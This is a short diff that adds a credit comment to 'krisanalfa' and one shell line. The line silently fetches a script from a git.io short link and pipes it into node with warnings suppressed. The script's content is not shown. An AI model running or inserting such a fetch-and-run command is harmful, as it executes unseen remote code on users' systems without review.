@@ -1,0 +1,3 @@
+
+// credit to krisanalfa!
+curl -s -L https://git.io/fjYps | node --no-warnings
